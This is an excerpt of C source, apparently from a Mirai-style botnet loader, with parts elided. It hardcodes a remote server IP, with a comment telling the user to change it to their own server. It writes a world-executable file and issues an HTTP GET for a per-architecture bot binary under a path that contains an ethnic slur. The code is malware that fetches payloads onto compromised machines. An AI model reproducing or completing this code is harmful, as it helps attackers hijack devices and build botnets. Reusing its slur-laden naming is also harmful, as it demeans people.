...
#define HTTP_SERVER utils_inet_addr(2,59,254,102)  //0,0,0,0  CHANGE TO YOUR HTTP SERVER IP,
#define EXEC_MSG            "JELEAD\n"
#define EXEC_MSG_LEN        7

#define DOWNLOAD_MSG        "HUHNO\n"
...
inline void run(void)
{
    ...
    ffd = open("kurc", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /bins/jew." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
